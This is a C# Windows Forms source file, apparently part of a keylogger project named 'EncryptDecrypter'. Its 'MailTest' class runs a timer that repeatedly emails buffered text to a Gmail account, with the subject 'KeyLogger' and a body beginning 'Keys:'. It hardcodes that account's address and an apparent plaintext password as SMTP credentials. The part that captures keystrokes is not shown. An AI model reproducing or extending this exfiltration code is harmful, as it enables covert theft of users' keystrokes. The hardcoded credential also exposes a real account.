using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Timers;
using System.Net.Mail;
using System.Drawing.Imaging;
using System.Net;

namespace EncryptDecrypter
{
    public partial class MailTest : Form
    {
        public MailTest()
        {
            InitializeComponent();
        }
        System.Windows.Forms.Timer myTimer = new System.Windows.Forms.Timer();
        StringBuilder builder = new StringBuilder();

        private void MailTest_Load(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// Starts Mailing at said interval
        /// </summary>
        /// <param name="secondsRepeat"></param>
        public void startBurst(int timeInterval)
        {
            myTimer.Tick += new EventHandler(TimerEventProcessor);
            myTimer.Interval = timeInterval;
            myTimer.Start();
        }

        private void TimerEventProcessor(Object myObject, EventArgs myEventArgs)
        {
            MessageBox.Show("hi" + builder.ToString());
            FileWrite("timer", "1", true);
            MailNow(builder.ToString() + "");
        }

        public void MailNow(String Message)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress("insaneclanchat@gmail.com");
            mail.To.Add("insaneclanchat@gmail.com");
            mail.Subject = "KeyLogger";
            mail.Body = "Keys: " + Message;

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("insaneclanchat@gmail.com", "zammy13cool");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }

        public void FileWrite(String mFileName, String Text, Boolean newLine)
        {
            String fileName = @"\" + mFileName + ".txt";

            string path = Environment.CurrentDirectory + fileName;
            if (!File.Exists(path))
            {
                File.Create(path).Close();
                TextWriter tw = new StreamWriter(path);
                if (newLine == false)
                {
                    tw.Write(Text);
                }
                else
                {
                    tw.WriteLine(Text);
                }
                tw.Close();
            }
            else if (File.Exists(path))
            {
                TextWriter tw = new StreamWriter(path, true);
                if (newLine == false)
                {
                    tw.Write(Text);
                }
                else
                {
                    tw.WriteLine(Text);
                }
                tw.Close();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String s = textBox1.Text.ToString();
            MailNow(s);
        }
    }
}
